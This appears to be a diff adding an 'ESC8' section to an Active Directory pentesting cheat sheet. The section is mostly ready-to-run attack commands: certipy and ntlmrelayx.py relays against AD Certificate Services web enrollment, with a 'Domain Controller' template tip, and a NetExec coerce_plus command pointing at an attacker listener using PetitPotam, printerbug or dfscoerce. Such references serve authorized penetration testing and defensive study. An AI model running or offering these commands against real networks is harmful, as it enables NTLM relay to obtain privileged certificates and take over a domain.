@@ -830,6 +830,31 @@ u.objectid ENDS WITH "-548" RETURN q
   ```
 </details> 
 
+<details>
+  <summary> ESC8 </summary> 
+  
+    ### http
+  ```shell
+  certipy relay -target <target_server> -ca <Certificate_authorities> -template <vulnerable_template>
+  ```
+
+  ### https
+  ```shell
+  ntlmrelayx.py -t https://<target_server>/certsrv/certfnsh.asp -smb2 --adcs --template <vulnerable_template>
+  ```
+  #### --template 'Domain Controller' can be most times be used
+
+  ### NetExec Coerce Authentication
+  ```shell
+  NetExec smb <target> -u <AD_user> -p <AD_password> -M coerce_plus -o LISTENER=<AttackerIP> METHOD=<method>
+  ```
+  ### Methods
+  * PetitPotam
+  * printerbug
+  * dfscoerce
+
+</details> 
+
 # Kerberoasting & ASREPRoast
 <details>
   <summary> Kerberoasting </summary> 
